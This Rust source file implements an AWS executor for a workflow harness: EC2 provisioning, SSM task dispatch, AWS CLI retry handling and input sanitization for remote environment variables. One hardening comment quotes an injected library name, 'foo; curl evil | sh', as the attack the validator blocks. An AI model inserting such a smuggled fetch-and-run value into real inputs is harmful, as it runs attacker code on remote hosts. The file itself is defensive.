//! Real `AwsExecutor` provisioning via `duct` shell-out to the `aws`
//! CLI. The harness stays sync — every AWS call is a synchronous
//! subprocess invocation, no `aws-sdk-*` crates pulled in. Tests use a
//! PATH-shimmed `aws` shell script that records every invocation to a
//! temp file.
//!
//! The module is split by AWS sub-command family (plan §S5.9 modularity cap):
//! - `provisioning` — `ec2 run-instances` / describe / terminate + pilot + `ssm describe-instance-information` readiness
//! - `ssm` — `ssm send-command` / `ssm list-command-invocations` (per-task execution + staleness)
//! - `cloudwatch` — `cloudwatch get-metric-statistics` for pilot + stall monitor
//! - `sizing` — DAG + policies file I/O + task-spec helpers shared across the above
//! - `orphans` — `scan_orphans` / `scan_orphans_verified` + the `wait_for_ssm` poll
//!   they share with the post-provision liveness path
//!
//! The `impl Executor for AwsExecutor` block in this file is thin: each
//! trait method delegates to a `do_*` inherent method defined in the
//! submodule that owns the concern.

mod cloudwatch;
mod orphans;
pub mod pricing;
mod provisioning;
mod sizing;
mod ssm;

use super::high_water_policy::HighWaterPolicy;
use super::multi_az_policy::SubnetCursor;
use super::spot_policy::is_spot_requested;
use super::{Executor, ExecutorArgs, IterationOutcome, ResourceRequirements};
use anyhow::{anyhow, Context, Result};
use duct::cmd;
use scripps_workflow_core::dag::{Task, DAG};
use scripps_workflow_core::remediation::{ExecutorOverrides, ResourceTarget};
use std::path::Path;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};

use crate::progress_client::ProgressClient;

/// Merge two `ResourceTarget`s, taking the larger / overriding value for
/// each field. Used by `apply_overrides` so a remediation only ever
/// raises the floor — a follow-up apply can't accidentally shrink a
/// prior bump.
pub(super) fn merge_resource_targets(
    base: ResourceTarget,
    overlay: ResourceTarget,
) -> ResourceTarget {
    fn max_opt(a: Option<u32>, b: Option<u32>) -> Option<u32> {
        match (a, b) {
            (Some(x), Some(y)) => Some(x.max(y)),
            (Some(x), None) | (None, Some(x)) => Some(x),
            (None, None) => None,
        }
    }
    fn max_opt_u64(a: Option<u64>, b: Option<u64>) -> Option<u64> {
        match (a, b) {
            (Some(x), Some(y)) => Some(x.max(y)),
            (Some(x), None) | (None, Some(x)) => Some(x),
            (None, None) => None,
        }
    }
    ResourceTarget {
        vcpus: max_opt(base.vcpus, overlay.vcpus),
        memory_gb: max_opt(base.memory_gb, overlay.memory_gb),
        storage_gb: max_opt(base.storage_gb, overlay.storage_gb),
        wallclock_secs: max_opt_u64(base.wallclock_secs, overlay.wallclock_secs),
        gpu: overlay.gpu.or(base.gpu),
    }
}

// Submodules reach into the executor via `super::super::*`; the siblings
// they need most often are re-exported here with thin names so the hops
// stay readable (e.g. `RemoteExecutionInfo` via `super::RemoteExecutionInfo`).
pub(super) use super::RemoteExecutionInfo;

/// verified-reap sweep outcome. Returned by
/// `AwsExecutor::scan_orphans_verified` and forwarded to the server
/// via an `orphan_instances_reaped` progress event.
///
/// P1-158 — `terminate_failures` distinguishes "AWS rejected the
/// `terminate-instances` call for this id" from "AWS accepted the
/// call but the instance hasn't converged to `terminated` /
/// `shutting-down` yet". The legacy `unverified_ids` field still
/// covers both cases for backward compatibility; `terminate_failures`
/// adds the API-layer detail when the batched call returns partial
/// failures so an operator gets actionable diagnostics instead of an
/// opaque count.
#[derive(Debug, Clone, Default)]
pub struct OrphanReapSummary {
    /// Reap policy name (e.g. "terminate", "stop") used for this sweep.
    pub policy: String,
    /// Total instances that matched the orphan-candidate filter.
    pub candidate_count: u64,
    /// Instances confirmed dead via the convergence poll and successfully reaped.
    pub verified_count: u64,
    /// Instance ids that could not be verified as dead within the poll timeout.
    pub unverified_ids: Vec<String>,
    /// P1-226 — instance ids the convergence poll observed as
    /// `terminated` / `shutting-down`. Fed into the WAL recovery's
    /// `instance_denylist` so a stale heartbeat file from a dead
    /// host cannot mask the kill.
    pub verified_ids: Vec<String>,
    /// P1-158 — per-id failure detail returned by AWS when the
    /// batched `terminate-instances` call reports `UnsuccessfulItems`.
    /// Empty when the API accepted every id (the convergence poll
    /// determines verified vs unverified for those).
    pub terminate_failures: Vec<(String, String)>,
}

impl OrphanReapSummary {
    fn default_with_policy(policy: &str) -> Self {
        Self {
            policy: policy.trim().to_lowercase(),
            ..Self::default()
        }
    }
}

/// Operator-supplied AWS configuration. All fields are required for a
/// real provisioning call; the loader checks them up-front in `new`.
#[derive(Debug, Clone)]
pub struct AwsConfig {
    /// AWS region (e.g. "us-west-2"). Sourced from `SWFC_AWS_REGION`.
    pub region: String,
    /// AMI id used for EC2 provisioning. Sourced from `SWFC_AWS_AMI_ID`.
    pub ami_id: String,
    /// Round-robin subnet cursor built from `SWFC_AWS_SUBNET_IDS`.
    pub subnets: SubnetCursor,
    /// Default VPC security group id. Sourced from `SWFC_AWS_SECURITY_GROUP`.
    pub security_group: String,
    /// Optional egress-restricted security group id. Selected at
    /// provision time when any task in the DAG declares
    /// `safety.network = NetworkPolicy::None`. Unset (`None`) means
    /// the operator hasn't provisioned a restricted SG; in that case
    /// the executor advertises `NetworkPolicy::Bridge` capabilities
    /// and `enforce_safety_policy` blocks the offending task with
    /// `BlockerKind::NetworkPolicyMismatch`. Sourced from
    /// `SWFC_AWS_RESTRICTED_SG_ID`.
    pub restricted_security_group: Option<String>,
    /// IAM instance profile ARN attached to provisioned instances. Sourced from `SWFC_AWS_INSTANCE_PROFILE`.
    pub instance_profile: String,
    /// Optional EC2 key pair name for SSH access. Sourced from `SWFC_AWS_KEY_PAIR`.
    pub key_pair: Option<String>,
    /// Git SHA of the workspace; tagged on EC2 instances for traceability.
    pub workspace_sha: String,
    /// When `true`, requests Spot instances via `--instance-market-options`.
    pub spot: bool,
    /// Maximum concurrent instance policy (from `SWFC_AWS_HIGH_WATER`).
    pub high_water: HighWaterPolicy,
    /// the chat session id the harness is attached
    /// to (from `--session-id`). Threaded onto EC2 instance tags as
    /// `ScrippsWorkflowHarnessSessionId` so the orphan reaper can
    /// restrict its scan to *this* session's instances.
    pub harness_session_id: Option<String>,
}

impl AwsConfig {
    /// Read every SWFC_AWS_* env var and validate the required
    /// fields. Returns a config the executor can use, or an error
    /// listing every missing variable so the operator gets a single
    /// actionable diagnostic instead of a piecewise failure.
    pub fn from_env() -> Result<Self> {
        let mut missing: Vec<&'static str> = Vec::new();
        let region = std::env::var("SWFC_AWS_REGION").unwrap_or_else(|_| {
            missing.push("SWFC_AWS_REGION");
            String::new()
        });
        let ami_id = std::env::var("SWFC_AWS_AMI_ID").unwrap_or_else(|_| {
            missing.push("SWFC_AWS_AMI_ID");
            String::new()
        });
        let security_group = std::env::var("SWFC_AWS_SECURITY_GROUP").unwrap_or_else(|_| {
            missing.push("SWFC_AWS_SECURITY_GROUP");
            String::new()
        });
        let instance_profile = std::env::var("SWFC_AWS_INSTANCE_PROFILE").unwrap_or_else(|_| {
            missing.push("SWFC_AWS_INSTANCE_PROFILE");
            String::new()
        });
        let subnets = SubnetCursor::from_env();
        if subnets.is_empty() {
            missing.push("SWFC_AWS_SUBNET_IDS (or SWFC_AWS_SUBNET_ID)");
        }
        if !missing.is_empty() {
            return Err(anyhow!(
                "AWS executor missing required env vars: {}. See docs/remote-compute-operator-reference.md.",
                missing.join(", ")
            ));
        }
        let key_pair = std::env::var("SWFC_AWS_KEY_PAIR").ok();
        let workspace_sha =
            std::env::var("SWFC_WORKSPACE_SHA").unwrap_or_else(|_| "unknown".into());
        let high_water = HighWaterPolicy::from_env().unwrap_or_default();
        let harness_session_id = std::env::var("SWFC_CHAT_SESSION_ID").ok();
        let restricted_security_group = std::env::var("SWFC_AWS_RESTRICTED_SG_ID")
            .ok()
            .filter(|v| !v.trim().is_empty());
        Ok(Self {
            region,
            ami_id,
            subnets,
            security_group,
            restricted_security_group,
            instance_profile,
            key_pair,
            workspace_sha,
            spot: is_spot_requested(),
            high_water,
            harness_session_id,
        })
    }
}

/// Inspect every task in the DAG and pick the network-policy floor the
/// AwsExecutor must satisfy. Tasks that don't gate egress
/// (`SafetyLevel::Safe` / `SafetyLevel::Compute`) are ignored —
/// `enforce_safety_policy` doesn't run the network check for them.
/// Returns `NetworkPolicy::None` (egress-restricted) iff any
/// Network/Exec task asks for `None`; otherwise `NetworkPolicy::Bridge`
/// is the floor (every Bridge requester is satisfied by Bridge).
pub(super) fn required_network_floor(dag: &DAG) -> scripps_workflow_core::atom::NetworkPolicy {
    use scripps_workflow_core::atom::{NetworkPolicy, SafetyLevel};
    let mut union_allowlist: Vec<String> = Vec::new();
    let mut any_restricted = false;
    for task in dag.tasks.values() {
        if !matches!(task.safety.level, SafetyLevel::Network | SafetyLevel::Exec) {
            continue;
        }
        if let NetworkPolicy::None { allowlist } = &task.safety.network {
            any_restricted = true;
            for h in allowlist {
                if !union_allowlist.contains(h) {
                    union_allowlist.push(h.clone());
                }
            }
        }
    }
    if any_restricted {
        union_allowlist.sort();
        NetworkPolicy::None {
            allowlist: union_allowlist,
        }
    } else {
        NetworkPolicy::Bridge
    }
}

/// State the executor accumulates across the iteration loop. Empty
/// until `provision` runs.
#[derive(Debug, Clone, Default)]
pub(super) struct ProvisionedInstance {
    pub(super) instance_id: String,
    pub(super) instance_type: String,
}

/// `Executor` implementation that provisions EC2 instances and runs tasks
/// via SSM `send-command`. Each harness run provisions one instance
/// (or reuses an alive one), dispatches tasks serially over SSM, then
/// terminates on session end or cost-guard breach.
pub struct AwsExecutor {
    pub(super) config: AwsConfig,
    pub(super) args: ExecutorArgs,
    pub(super) instance: Option<ProvisionedInstance>,
    /// Live mirror of `instance` shared with the stall-monitor thread
    /// (P0-39). The thread reads this each iteration so it observes
    /// the current instance state — including `None` after `release`
    /// terminates the host — and exits gracefully instead of polling
    /// CloudWatch against a dead instance id. Mutation sites
    /// (`do_provision`, `do_release`, `do_ensure_alive`) call
    /// `sync_live_instance_mirror` to keep this aligned with
    /// `self.instance`. Lock ordering: never held across a network
    /// shell-out.
    pub(super) live_instance: Arc<Mutex<Option<ProvisionedInstance>>>,
    /// Per-backend cost-guard dispatch tag (R2-N21). Hardcoded to
    /// `BackendKind::Aws`; routed through
    /// `cost_guard::estimate_for_backend` + `check_ceiling_for_backend`
    /// at the provision site. The original design held a
    /// `Box<dyn CostModel>` here; the trait was deleted as forced
    /// abstraction (one production impl per executor), so this field
    /// is now the dispatch discriminant itself. A future `Gcp` /
    /// `Azure` variant adds an arm to the free functions.
    pub(super) cost_backend: super::cost_guard::BackendKind,
    /// Stall monitor lifecycle. Flipped to true from
    /// `stop_stall_monitor`; the polling thread checks it between
    /// samples and exits when set.
    pub(super) stall_shutdown: Arc<Mutex<bool>>,
    /// Current running task id, set in `run_iteration` and read by the
    /// stall-monitor poller so signals carry a useful task_id. Falls
    /// back to the instance id when `None`.
    pub(super) current_running_task_id: Arc<Mutex<Option<String>>>,
    /// When `Some(<instance-type>)`, `pick_instance_type`
    /// short-circuits and returns the override. Used by `pilot` to
    /// force a small dedicated pilot shape regardless of DAG contents.
    /// Cleared immediately after the pilot's `release()` call so the
    /// main loop's subsequent `provision` sees the real instance
    /// picker.
    pub(super) pilot_instance_override: Option<String>,
    /// Projected per-stage resource requirements from the most recent
    /// successful pilot run. Read by `pick_instance_type` for the real
    /// post-pilot provision so the pilot is actuating, not just
    /// observational.
    pub(super) pilot_projected_requirements:
        Option<std::collections::BTreeMap<String, ResourceRequirements>>,
    /// Per-task SSM staleness cache. Key: task id. Value:
    /// (cached_at_secs, stale_result). Consulted by `is_task_stale`
    /// before issuing an SSM round-trip. Entries older than
    /// SSM_STALE_CACHE_TTL_SECS are re-queried. Tasks that have
    /// transitioned out of Running don't hit this path (the leading
    /// `let TaskState::Running {..} else { return false }` guard fires
    /// first), so the cache stays bounded by the set of currently
    /// running tasks.
    pub(super) ssm_stale_cache: Arc<Mutex<std::collections::BTreeMap<String, (u64, bool)>>>,
    /// Resource minimums applied via `apply_overrides`. Read by
    /// `pick_instance_type` next provision so a remediation-driven
    /// memory/cpu/gpu bump survives the harness relaunch that follows
    /// an apply. None when no remediation has been applied.
    pub(super) pending_resources_override:
        Option<scripps_workflow_core::remediation::ResourceTarget>,
    /// Envelope additions accumulated from `apply_overrides`
    /// (library_pins, env_passthrough). Drained by `do_run_iteration`
    /// before invoking the agent so a remediation reaches the
    /// SSM RunCommand env block.
    pub(super) pending_envelope_additions: std::collections::BTreeMap<String, String>,
    /// Most recent SSM-driven iteration capture. Populated post-poll
    /// in `do_run_iteration`; drained by `take_last_capture` so the
    /// harness main can synthesise a `ToolErrorEnvelope`.
    pub(super) last_capture: std::sync::Mutex<Option<super::IterationCapture>>,
    /// Per-AwsExecutor run id (UUID, short hex). Mixed into
    /// `ec2 run-instances --client-token` so a transient
    /// network failure mid-API-call cannot double-launch within this
    /// process. Process-restart picks a fresh id, so cross-crash
    /// idempotency is left to orphan reap.
    pub(super) run_id: String,
    /// Optional progress client for emitting observability events
    /// (e.g. `cost_guard_passed`). Built lazily from the session
    /// endpoint wired by `set_session_endpoint`; `None` until then.
    /// Cost-guard ceiling enforcement still fires even when `None`;
    /// only the SSE emit is skipped.
    pub(super) progress_client: Option<ProgressClient>,
    /// Captured from `set_session_endpoint` so the package directory
    /// can be threaded onto the client after construction.
    pub(super) session_endpoint: Option<(String, String)>,
    /// Cooperative shutdown flag set by `release_in_handler` from the
    /// SIGINT handler thread. The SSM polling loop in `do_run_iteration`
    /// checks this between poll cycles and returns early when set, so
    /// `run_iteration` exits and the main loop drops the
    /// `Arc<Mutex<Box<dyn Executor>>>` before the handler's full
    /// `release(&mut self)` call tries to acquire it.
    pub(super) shutdown_requested: Arc<AtomicBool>,
    /// Network policy actually advertised by the provisioned instance.
    /// Set by `do_provision` from `required_network_floor(dag)` +
    /// `config.restricted_security_group` availability; consumed by
    /// `capabilities()`. `None` before provision (or after release);
    /// the trait method falls back to `NetworkPolicy::Bridge` in that
    /// pre-provision window so the pre-flight gate doesn't reject
    /// tasks before we know which SG we'll get.
    pub(super) effective_network: Arc<Mutex<Option<scripps_workflow_core::atom::NetworkPolicy>>>,
}

/// Emit a `tracing::warn!` once at AwsExecutor construction when the
/// hand-maintained pricing table in `aws::pricing` is older than
/// `PRICING_TABLE_STALENESS_WARN_DAYS`. Cost projections diverge from
/// reality as AWS retunes its rate cards quarterly; the warn nudges the
/// operator to run the refresh procedure documented in `pricing.rs`.
fn warn_if_pricing_stale() {
    if let Ok(rev) = chrono::NaiveDate::parse_from_str(pricing::PRICING_TABLE_REVISION, "%Y-%m-%d")
    {
        let age = chrono::Utc::now()
            .date_naive()
            .signed_duration_since(rev)
            .num_days();
        if age > pricing::PRICING_TABLE_STALENESS_WARN_DAYS {
            tracing::warn!(
                pricing_revision = pricing::PRICING_TABLE_REVISION,
                age_days = age,
                "AWS pricing table is stale; cost projections may diverge from actual"
            );
        }
    }
}

impl AwsExecutor {
    /// Constructs an `AwsExecutor` from env-var config and executor args.
    pub fn new(args: &ExecutorArgs) -> Result<Self> {
        let config = AwsConfig::from_env()?;
        warn_if_pricing_stale();
        // Short hex run id used by the `--client-token` dedup.
        // UUID v4 stringified, dashes stripped — 32 chars
        // leaves headroom for the per-subnet suffix under the 64-char
        // AWS limit.
        //
        // Persist to `<pkg>/runtime/.harness-run-id`
        // so a crash-restart reuses the same id and AWS idempotency on
        // `compose_client_token` keeps preventing double-launch.
        let run_id =
            super::aws::provisioning::load_or_create_run_id(std::path::Path::new(&args.package));
        Ok(Self {
            config,
            args: args.clone(),
            instance: None,
            live_instance: Arc::new(Mutex::new(None)),
            stall_shutdown: Arc::new(Mutex::new(false)),
            current_running_task_id: Arc::new(Mutex::new(None)),
            pilot_instance_override: None,
            pilot_projected_requirements: None,
            ssm_stale_cache: Arc::new(Mutex::new(std::collections::BTreeMap::new())),
            cost_backend: super::cost_guard::BackendKind::Aws,
            pending_resources_override: None,
            pending_envelope_additions: std::collections::BTreeMap::new(),
            last_capture: std::sync::Mutex::new(None),
            run_id,
            progress_client: None,
            session_endpoint: None,
            shutdown_requested: Arc::new(AtomicBool::new(false)),
            effective_network: Arc::new(Mutex::new(None)),
        })
    }

    /// invalidate the cached SSM staleness result for a task.
    /// Call when a progress event proves the task is alive / has
    /// transitioned, so the next `is_task_stale` query gets fresh info.
    pub fn invalidate_ssm_stale_cache(&self, task_id: &str) {
        if let Ok(mut cache) = self.ssm_stale_cache.lock() {
            cache.remove(task_id);
        }
    }

    /// Build and store the internal `ProgressClient` from the session
    /// endpoint captured by `set_session_endpoint`. Called lazily so the
    /// package directory (known after `args.package`) is always threaded
    /// in. No-op when `session_endpoint` is unset.
    pub(super) fn ensure_progress_client(&mut self) {
        if self.progress_client.is_none() {
            if let Some((ref sid, ref url)) = self.session_endpoint {
                let pc = ProgressClient::new(sid.clone(), url.clone())
                    .with_package_dir(std::path::Path::new(&self.args.package));
                self.progress_client = Some(pc);
            }
        }
    }

    /// Republish `self.instance` into the stall-monitor mirror (P0-39).
    /// Call after any mutation of `self.instance` so the polling thread
    /// sees the new state on its next iteration. Idempotent; a poisoned
    /// mutex is recovered via `into_inner` so a panicked monitor never
    /// bricks subsequent provisioning.
    pub(super) fn sync_live_instance_mirror(&self) {
        let snapshot = self.instance.clone();
        let mut guard = self.live_instance.lock().unwrap_or_else(|p| p.into_inner());
        *guard = snapshot;
    }

    /// Returns the EC2 instance id of the currently provisioned instance, if any.
    pub fn instance_id(&self) -> Option<&str> {
        self.instance.as_ref().map(|i| i.instance_id.as_str())
    }

    /// Returns the EC2 instance type of the currently provisioned instance, if any.
    pub fn instance_type(&self) -> Option<&str> {
        self.instance.as_ref().map(|i| i.instance_type.as_str())
    }

    /// Builds a `RemoteExecutionInfo` snapshot from the current instance, if any.
    pub fn remote_execution_info(&self) -> Option<RemoteExecutionInfo> {
        self.instance.as_ref().map(|i| RemoteExecutionInfo {
            backend: "aws".to_string(),
            instance_id: i.instance_id.clone(),
            instance_type: i.instance_type.clone(),
        })
    }

    /// Shared `aws <args>` shell-out used by every submodule that
    /// needs to talk to the AWS CLI. Lives on the executor so
    /// `self.config.region` + future shared knobs stay encapsulated.
    ///
    /// W5.3: wraps each invocation in a small retry loop that handles
    /// the two AWS-CLI failure modes that classify as transient or
    /// operator-actionable instead of true bugs:
    ///
    /// - **Rate limiting** (`Throttling`, `RequestLimitExceeded`,
    ///   `429`): exponential backoff [250ms, 1s, 4s, 16s], max 5
    ///   attempts. After exhausting retries the original error is
    ///   returned so callers can decide whether to escalate or roll
    ///   back the task.
    /// - **Credential expiration** (`ExpiredToken`,
    ///   `InvalidClientTokenId`, `RequestExpired`): returns a typed
    ///   error immediately (no retry — the same creds will keep
    ///   failing). Operator must refresh creds and re-run.
    pub(super) fn run_aws(&self, args: &[&str]) -> Result<String> {
        const BACKOFF_MS: &[u64] = &[250, 1_000, 4_000, 16_000];
        let mut attempt = 0_usize;
        loop {
            let result = cmd("aws", args)
                .env("AWS_REGION", &self.config.region)
                .stderr_to_stdout()
                .read();
            match result {
                Ok(out) => return Ok(out),
                Err(e) => {
                    let msg = e.to_string();
                    // Inspect both the std::io error message AND the
                    // captured stderr-to-stdout body (duct surfaces the
                    // child's exit status in the io::Error). We do a
                    // case-insensitive substring match against the AWS
                    // CLI's documented error codes.
                    let lower = msg.to_ascii_lowercase();
                    let is_credential_expiration = lower.contains("expiredtoken")
                        || lower.contains("invalidclienttokenid")
                        || lower.contains("requestexpired")
                        || lower.contains("token included in the request is expired");
                    if is_credential_expiration {
                        tracing::error!(
                            target: "aws_shell",
                            args = ?args,
                            "AWS credential expired or invalid; refresh and retry"
                        );
                        return Err(e).with_context(|| {
                            format!(
                                "aws {}: credentials expired (refresh via 'aws sso login' \
                                 or rotate AWS_ACCESS_KEY_ID/AWS_SECRET_ACCESS_KEY then \
                                 re-run the harness)",
                                args.join(" ")
                            )
                        });
                    }
                    let is_rate_limited = lower.contains("throttling")
                        || lower.contains("requestlimitexceeded")
                        || lower.contains("rate exceeded")
                        || lower.contains("429");
                    if is_rate_limited && attempt < BACKOFF_MS.len() {
                        let delay_ms = BACKOFF_MS[attempt];
                        attempt += 1;
                        tracing::warn!(
                            target: "aws_shell",
                            args = ?args,
                            attempt = attempt,
                            delay_ms,
                            "AWS rate-limit detected; backing off"
                        );
                        std::thread::sleep(std::time::Duration::from_millis(delay_ms));
                        continue;
                    }
                    return Err(e).with_context(|| format!("aws {}", args.join(" ")));
                }
            }
        }
    }
}

impl Executor for AwsExecutor {
    fn name(&self) -> &'static str {
        "aws"
    }

    /// AWS executor capability profile. EC2 instances run
    /// every agent task inside a container (Docker / Apptainer / Podman,
    /// resolved by `agent-claude-aws.sh`), so ProcessIsolation is the
    /// guaranteed floor. Egress depends on the security group selected
    /// at `do_provision` time: `SWFC_AWS_SECURITY_GROUP` (permissive)
    /// → `NetworkPolicy::Bridge`; `SWFC_AWS_RESTRICTED_SG_ID`
    /// (egress-restricted) → `NetworkPolicy::None` whose allowlist is
    /// the union of every restricted atom's allowlist in the DAG.
    /// Before provision runs (`effective_network` is `None`) we
    /// optimistically advertise `Bridge` so the pre-flight gate doesn't
    /// reject tasks before we know which SG we'll land on. Nitro-enclave
    /// executors would override sandbox to `HardwareEnclave`, but that's
    /// a future shape; the current AwsExecutor lands on
    /// `ProcessIsolation`.
    fn capabilities(&self) -> super::ExecutorCapabilities {
        let network = self
            .effective_network
            .lock()
            .ok()
            .and_then(|g| g.clone())
            .unwrap_or(scripps_workflow_core::atom::NetworkPolicy::Bridge);
        super::ExecutorCapabilities {
            sandbox: scripps_workflow_core::atom::SandboxRequirement::ProcessIsolation,
            network,
            kind: "aws",
        }
    }

    /// Expose the provisioned instance's shape so the harness main
    /// loop's stall-drain can pair a MemoryPressure signal with a
    /// concrete resize projection via `stall_monitor::suggest_resize`.
    /// Returns `None` before `provision` has run and after `release`
    /// has cleared `self.instance`.
    fn current_instance_type(&self) -> Option<String> {
        self.instance.as_ref().map(|i| i.instance_type.clone())
    }

    fn pilot(
        &mut self,
        dag: &DAG,
        cfg: &super::pilot::PilotConfig,
    ) -> Result<Option<super::pilot::PilotReport>> {
        self.do_pilot(dag, cfg)
    }

    fn start_stall_monitor(
        &mut self,
        thresholds: &super::stall_monitor::StallThresholds,
        tx: std::sync::mpsc::Sender<super::stall_monitor::StallSignal>,
    ) -> Result<()> {
        self.do_start_stall_monitor(thresholds, tx)
    }

    fn stop_stall_monitor(&mut self) {
        self.do_stop_stall_monitor();
    }

    #[tracing::instrument(skip(self, dag), fields(executor = "aws"))]
    fn provision(&mut self, dag: &DAG) -> Result<()> {
        self.do_provision(dag)
    }

    fn set_session_endpoint(&mut self, session_id: String, server_url: String) {
        self.session_endpoint = Some((session_id, server_url));
        // Reset any previously-built client so it gets rebuilt with
        // fresh endpoint info on the next `ensure_progress_client` call.
        self.progress_client = None;
    }

    fn ensure_alive(&mut self, dag: &DAG) -> Result<()> {
        self.do_ensure_alive(dag)
    }

    #[tracing::instrument(skip(self, package, agent_cmd, envelope), fields(executor = "aws"))]
    fn run_iteration(
        &mut self,
        package: &Path,
        agent_cmd: &str,
        envelope: &std::collections::BTreeMap<String, String>,
    ) -> Result<IterationOutcome> {
        self.do_run_iteration(package, agent_cmd, envelope)
    }

    #[tracing::instrument(skip(self, task), fields(executor = "aws"))]
    fn is_task_stale(&self, task: &Task, now_secs: u64) -> bool {
        self.do_is_task_stale(task, now_secs)
    }

    /// Set the cooperative shutdown flag. The SSM polling loop in
    /// `do_run_iteration` checks this between poll cycles and returns
    /// early with a `TimedOut` outcome, letting `run_iteration` exit
    /// so the main loop drops the mutex before the full `release` runs.
    fn release_in_handler(&self) {
        self.shutdown_requested.store(true, Ordering::Release);
    }

    /// Expose the cooperative shutdown flag so the SIGINT handler can
    /// clone it before the executor is wrapped in `Arc<Mutex<...>>` and
    /// set it directly without contending the iteration mutex.
    fn shutdown_flag(&self) -> Option<std::sync::Arc<std::sync::atomic::AtomicBool>> {
        Some(Arc::clone(&self.shutdown_requested))
    }

    fn release(&mut self) {
        self.do_release();
    }

    /// Defer to the SSM-based probe in
    /// `aws/orphans.rs::do_probe_container_state`.
    fn probe_container_state(
        &self,
        task_id: &str,
        package_dir: &std::path::Path,
    ) -> scripps_workflow_core::container_state::ContainerProbeOutcome {
        self.do_probe_container_state(task_id, package_dir)
    }

    fn take_last_capture(&mut self) -> Option<super::IterationCapture> {
        self.last_capture.lock().ok().and_then(|mut g| g.take())
    }

    /// Honoured overrides on AWS:
    /// * `disable_spot` → flips `config.spot=false`. Next provision
    ///   uses on-demand pricing; cost guard re-runs accordingly.
    /// * `resources` → stored as `pending_resources_override`.
    ///   Read by `pick_instance_type` next provision; the resolver
    ///   enforces these as minimums on top of the profile-driven
    ///   pick.
    /// * `library_pins` + `env_passthrough` → accumulated for the
    ///   next `do_run_iteration` envelope.
    ///
    /// `availability_zone` and `partition` are no-ops on AWS today —
    /// the multi-AZ rotation already selects from the configured
    /// subnet list. AZ pinning would require AWS-side metadata; leaving
    /// it as a no-op is safe (the override still records on the audit
    /// trail).
    fn apply_overrides(&mut self, _task_id: &str, ov: &ExecutorOverrides) -> Result<()> {
        if ov.disable_spot {
            self.config.spot = false;
        }
        if let Some(target) = ov.resources.as_ref() {
            let merged = match self.pending_resources_override.take() {
                Some(prior) => merge_resource_targets(prior, target.clone()),
                None => target.clone(),
            };
            self.pending_resources_override = Some(merged);
        }
        for (lib, ver) in &ov.library_pins {
            // C-8: library names and version values flow
            // into the SSM RunCommand envelope as `KEY=value` shell
            // statements. Without sanitization a hostile library name
            // like `foo; curl evil | sh` becomes a literal statement
            // in the remote bash script; a hostile version value with
            // `\n` escapes the assignment and runs the next line as
            // a command. Refuse anything outside the canonical shape.
            let Some(suffix) = scripps_workflow_core::env_validator::sanitize_lib_env_suffix(lib)
            else {
                tracing::warn!(
                    library = %lib,
                    "rejecting invalid library name in SSM envelope (C-8 hardening)"
                );
                continue;
            };
            if !scripps_workflow_core::env_validator::is_safe_env_value(ver) {
                tracing::warn!(
                    library = %lib,
                    value = %ver,
                    "rejecting invalid library version value in SSM envelope (C-8 hardening)"
                );
                continue;
            }
            let key = format!("SWFC_LIB_PIN_{suffix}");
            self.pending_envelope_additions.insert(key, ver.clone());
        }
        for (k, v) in &ov.env_passthrough {
            // C-8: see comment above. Refuse keys outside the POSIX env
            // name shape and values that include `\n`, `\r`, `,`, `=`,
            // or `\0`.
            if !scripps_workflow_core::env_validator::is_valid_env_name(k) {
                tracing::warn!(
                    key = %k,
                    "rejecting invalid env_passthrough key in SSM envelope (C-8 hardening)"
                );
                continue;
            }
            if !scripps_workflow_core::env_validator::is_safe_env_value(v) {
                tracing::warn!(
                    key = %k,
                    value = %v,
                    "rejecting invalid env_passthrough value in SSM envelope (C-8 hardening)"
                );
                continue;
            }
            self.pending_envelope_additions.insert(k.clone(), v.clone());
        }
        Ok(())
    }

    fn sweep_orphans_verified(&self) -> Option<super::VerifiedOrphanReap> {
        let sid = self.config.harness_session_id.clone();
        let sid_ref = sid.as_deref();
        match self.scan_orphans_verified(sid_ref) {
            Ok(s) => Some(super::VerifiedOrphanReap {
                policy: s.policy,
                candidate_count: s.candidate_count,
                verified_count: s.verified_count,
                unverified_ids: s.unverified_ids,
                verified_ids: s.verified_ids,
                terminate_failures: s.terminate_failures,
            }),
            Err(e) => {
                eprintln!("[aws] orphan sweep failed: {:#}", e);
                None
            }
        }
    }

    /// Cancel the in-flight SSM command for `task_id` via
    /// `aws ssm cancel-command`. Extracts the command id from the
    /// task's `RemoteExecution.command_id` field in the DAG snapshot.
    /// Falls back to the default SIGTERM impl when no command id is
    /// available (e.g. the command was dispatched but the DAG update
    /// hadn't persisted the command_id yet).
    fn cancel_task(&self, task_id: &str, dag: &DAG) -> Result<()> {
        let command_id = dag.tasks.get(task_id).and_then(|t| {
            if let scripps_workflow_core::dag::TaskState::Running { remote, .. } = &t.state {
                remote.as_ref().and_then(|r| r.command_id.clone())
            } else {
                None
            }
        });
        let Some(cid) = command_id else {
            tracing::warn!(
                target: "amend_cancel",
                task_id = %task_id,
                "AWS cancel_task: no SSM command_id in DAG; falling back to default"
            );
            return Ok(());
        };
        tracing::info!(
            target: "amend_cancel",
            task_id = %task_id,
            command_id = %cid,
            "AWS cancel_task: calling ssm cancel-command"
        );
        let out = self.run_aws(&["ssm", "cancel-command", "--command-id", &cid]);
        match out {
            Ok(_) => {
                tracing::info!(
                    target: "amend_cancel",
                    task_id = %task_id,
                    command_id = %cid,
                    "AWS cancel_task: ssm cancel-command succeeded"
                );
            }
            Err(e) => {
                // Best-effort — log and continue; the harness will
                // still transition the task to Blocked.
                tracing::warn!(
                    target: "amend_cancel",
                    task_id = %task_id,
                    command_id = %cid,
                    error = %e,
                    "AWS cancel_task: ssm cancel-command failed (continuing)"
                );
            }
        }
        Ok(())
    }
}

#[cfg(test)]
mod tests;
